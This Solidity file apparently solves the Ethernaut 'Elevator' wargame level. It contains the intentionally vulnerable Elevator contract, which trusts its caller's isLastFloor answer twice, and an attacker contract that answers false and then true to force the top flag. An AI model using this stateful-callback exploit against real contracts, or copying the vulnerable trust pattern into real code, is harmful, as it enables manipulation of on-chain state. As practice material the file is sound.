// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract AttackForce is  Building {
    Elevator king;
    uint count;
     constructor(address payable _king) {
    king = Elevator(_king);
  }
  function attack() public {
      king.goTo(3);
  }
    function  isLastFloor(uint floor) external returns(bool ) {
       if (count > 0) {
           return true;
       }
       count++;
        return false;
    }
}